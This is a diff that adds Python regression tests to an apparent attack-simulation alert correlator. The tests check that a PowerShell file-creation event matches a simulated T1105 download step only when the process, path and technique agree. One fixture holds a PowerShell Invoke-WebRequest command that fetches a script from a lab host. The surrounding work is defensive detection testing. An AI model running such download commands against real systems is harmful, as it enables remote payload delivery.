@@ -50,6 +50,25 @@ def scheduled_action_event():
     e['rule']={'id':'92052','description':'Generic command prompt alert'}
     return e
 
+def download_report():
+    rep=report()
+    rep['steps']['a']['steps'][0].update(
+        name='download lab script',
+        command=r"Invoke-WebRequest -Uri 'http://lab/file/download' -OutFile $path",
+        attack={'technique_id':'T1105'},
+        output={'stdout':r'C:\BASLab\delivery-test\lab-note.ps1'})
+    return rep
+
+def file_creation_event():
+    e=event()
+    e['data']['win']['system']['eventID']='11'
+    e['data']['win']['eventdata']={
+        'processId':'100','processGuid':'{test-guid}',
+        'image':r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe',
+        'targetFilename':r'C:\BASLab\delivery-test\lab-note.ps1'}
+    e['rule']={'id':'92203','description':'Executable file created by powershell'}
+    return e
+
 class RegressionTests(unittest.TestCase):
     def result(self, alerts=None, archives=None, rep=None):
         return correlate(rep or report(), export(alerts or []), '002', archives=archives)['results'][0]
@@ -108,6 +127,25 @@ class RegressionTests(unittest.TestCase):
         self.assertEqual(rows[1]['matched_archive_event_count'],1)
         self.assertEqual(rows[1]['evidence'][0]['relation'],'scheduled_task_action')
         self.assertEqual(rows[1]['evidence'][0]['task_name'],'Lab')
+
+    def test_t1105_file_creation_matches_exact_output_path_and_executor(self):
+        e=file_creation_event()
+        row=self.result([e],export([e],True),download_report())
+        self.assertEqual(row['detection'],'observed')
+        self.assertEqual(row['rule_ids'],'92203')
+        self.assertEqual(row['matched_archive_event_count'],1)
+        self.assertEqual(row['evidence'][0]['relation'],'file_created_by_executor')
+        self.assertEqual(row['evidence'][0]['target_filename'],r'C:\BASLab\delivery-test\lab-note.ps1')
+
+    def test_t1105_file_creation_rejects_other_pid_path_or_technique(self):
+        for mismatch in ('pid','path','technique','output'):
+            rep=download_report(); e=file_creation_event()
+            if mismatch=='pid': e['data']['win']['eventdata']['processId']='999'
+            if mismatch=='path': e['data']['win']['eventdata']['targetFilename']=r'C:\BASLab\delivery-test\other.ps1'
+            if mismatch=='technique': rep['steps']['a']['steps'][0]['attack']['technique_id']='T1059.001'
+            if mismatch=='output': rep['steps']['a']['steps'][0].pop('output')
+            row=self.result([e],rep=rep)
+            self.assertEqual(row['detection'],'no_matching_alert_observed',mismatch)
 
     def test_scheduled_action_requires_name_action_parent_and_time(self):
         for mismatch in ('name','action','parent','time'):
